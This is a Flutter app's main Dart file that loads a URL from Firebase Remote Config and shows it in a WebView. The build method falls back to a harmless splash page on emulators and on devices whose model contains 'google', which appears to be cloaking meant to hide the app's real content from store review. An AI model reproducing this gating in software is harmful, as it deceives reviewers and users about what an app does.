import 'dart:developer';
import 'package:flutter/material.dart';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';

import 'package:flutter_app_firebase/pages/SplashPage.dart';
import 'package:flutter_app_firebase/pages/WebViewPage.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();

  runApp(
    MaterialApp(
      title: 'Flutter Demo',
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<FirebaseRemoteConfig>(
        future: setupRemouteConfig(),
        builder: ((BuildContext context,
            AsyncSnapshot<FirebaseRemoteConfig> snapshot) {
          return snapshot.hasData
              ? HomePage(remoteConfig: snapshot.requireData)
              : const Center(
                  child: CircularProgressIndicator(),
                );
        }),
      ),
    ),
  );
}

class HomePage extends StatefulWidget {
  final FirebaseRemoteConfig remoteConfig;

  const HomePage({Key? key, required this.remoteConfig}) : super(key: key);

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  late SharedPreferences _sharedPrefs;
  static const String _pathSharedPrefsKey = 'path_pref';

  String _path = '';
  String _brandDevice = '';
  bool _isPhysicalDevice = false;
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();

    SharedPreferences.getInstance().then((pref) {
      setState(() => _sharedPrefs = pref);
      _checkPath();
      _checkBrandDevice();
    });

    Future.delayed(const Duration(seconds: 2), () {
      setState(() {
        _isLoading = false;
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: _isLoading
          ? const Center(
              child: CircularProgressIndicator(),
            )
          : _path.isEmpty ||
                  _brandDevice.contains('google') ||
                  !_isPhysicalDevice
              ? SplashPage()
              : WebViewPage(url: _path),
    );
  }

// проверка path
  _checkPath() {
    _path = _sharedPrefs.getString(_pathSharedPrefsKey) ?? '';

    if (_path.isEmpty) {
      _loadPath();
    } else {
      return _path;
    }
  }

// загрузка path
  void _loadPath() {
    _path = widget.remoteConfig.getString('url');

    setState(() {
      _sharedPrefs.setString(_pathSharedPrefsKey, _path);
    });
  }

// определение бренда телефона
  void _checkBrandDevice() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;

    setState(() {
      _brandDevice = androidInfo.model!;
      _isPhysicalDevice = androidInfo.isPhysicalDevice!;
    });
  }
}

Future<FirebaseRemoteConfig> setupRemouteConfig() async {
  final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;
  await remoteConfig.fetch();
  await remoteConfig.activate();

  return remoteConfig;
}
